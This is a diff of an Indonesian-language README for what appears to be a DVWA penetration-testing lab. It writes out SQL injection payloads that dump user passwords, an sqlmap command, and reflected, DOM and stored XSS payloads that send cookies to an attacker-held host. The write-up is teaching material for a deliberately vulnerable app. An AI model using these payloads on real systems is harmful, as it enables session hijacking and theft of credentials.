@@ -154,45 +154,45 @@ Metode pengujian mengacu pada standar **NIST SP 800-115**:
 - kita telah berhasil mendapatkan RCE
 
 ### 6. SQL Injection
-- test parameter 1
+- test parameter 1 \
   ![alt text](images/README/image-4.png)
-- test payload sql injection
-  ```' OR 1 = 1 #```
+- test payload sql injection \
+  ```' OR 1 = 1 #``` \
   ![alt text](images/README/image-5.png)
 - kita bisa mendapatkan semua data user
-- kita coba mencari passowrdnya dengan payload
-  ```' UNION SELECT user, password FROM users #```
+- kita coba mencari passowrdnya dengan payload \
+  ```' UNION SELECT user, password FROM users #``` \
   ![alt text](images/README/image-6.png)
-- lalu decode menggunakan crackstation / cyberchef
+- lalu decode menggunakan crackstation / cyberchef \
   ![alt text](images/README/image-7.png)
 
 ### 7. SQL Injection (Blind)
-- buka web sql injection blind, dan coba lakukan dengan sqlmap
-  ```sqlmap -u "http://<IP_Server>/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=hash; security=low" --dbs```
-  ![alt text](images/README/image-15.png)
+- buka web sql injection blind, dan coba lakukan dengan sqlmap \
+  ```sqlmap -u "http://<IP_Server>/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=hash; security=low" --dbs``` \
+  ![alt text](images/README/image-15.png) \
   ![alt text](images/README/image-16.png)
 
 ### 8. DOM Based Cross Site Scripting (XSS)
-- buka ```http://<IP_Server>/DVWA/vulnerabilities/xss_d/?default=<script>alert(document.cookie);</script>```
+- buka ```http://<IP_Server>/DVWA/vulnerabilities/xss_d/?default=<script>alert(document.cookie);</script>``` \
   ![alt text](images/README/image-17.png)
-- Membuat halaman untuk menampung cookie
+- Membuat halaman untuk menampung cookie \
   ```python3 -m http.server 80```
-- Melakukan pencurian cookie dan kirim ke halaman penampung
-  ```http://<IP_Server>/DVWA/vulnerabilities/xss_d/?default=<script>window.location='http://<IP_Attacker>/?cookie='+document.cookie</script>```
+- Melakukan pencurian cookie dan kirim ke halaman penampung \
+  ```http://<IP_Server>/DVWA/vulnerabilities/xss_d/?default=<script>window.location='http://<IP_Attacker>/?cookie='+document.cookie</script>``` \
   ![alt text](images/README/image-18.png)
 
 ### 9. Reflected Cross Site Scripting (XSS)
 - Reflected cross-site scripting (XSS) muncul saat aplikasi menerima data dalam permintaan HTTP dan menyertakan data tersebut dalam respons langsung dengan cara yang tidak aman.
-- menampilkan alert
-  ```<script>alert("test")</script>```
+- menampilkan alert \
+  ```<script>alert("test")</script>``` \
   ![alt text](images/README/image-19.png)
-- Menampilkan cookie halaman
-  ```<input onfocus=javascript:alert(document.cookie) autofocus>```
+- Menampilkan cookie halaman \
+  ```<input onfocus=javascript:alert(document.cookie) autofocus>```\
   ![alt text](images/README/image-20.png)
-- Melakukan pencurian cookie
-  ```<input onfocus=javascript:window.location='http://<IP_Attacker>/?cookie='+document.cookie autofocus>```
+- Melakukan pencurian cookie \
+  ```<input onfocus=javascript:window.location='http://<IP_Attacker>/?cookie='+document.cookie autofocus>``` \
   ![alt text](images/README/image-21.png)
-- bisa juga test deface pake script sederhana
+- bisa juga test deface pake script sederhana \
   ```js
   <script>
     const defaceDiv = document.createElement("div");
@@ -208,11 +208,11 @@ Metode pengujian mengacu pada standar **NIST SP 800-115**:
 
 ### 10. Stored Cross Site Scripting (XSS)
 - XSS Stored atau Persistent XSS muncul saat aplikasi menerima data dari sumber yang tidak tepercaya dan menyertakan data tersebut dalam respons HTTP selanjutnya dengan cara yang tidak aman.
-- Sebelum melakukan uji serangan, ubah maxlength pada textarea dari 50 menjadi 500 karakter melalui inspect element
+- Sebelum melakukan uji serangan, ubah maxlength pada textarea dari 50 menjadi 500 karakter melalui inspect element \
   ![alt text](images/README/image-22.png)
-- Masukkan script ini ke field Message
+- Masukkan script ini ke field Message \
   ```<script>window.location='http://<IP_Server>/?cookie='+document.cookie</script>```
-- tiap ada orang yang buka url web yang terkana xss stored maka dia cookienya akan dikirimkan ke ip attacker
+- tiap ada orang yang buka url web yang terkana xss stored maka dia cookienya akan dikirimkan ke ip attacker \
   ![alt text](images/README/image-24.png)
 
 ---
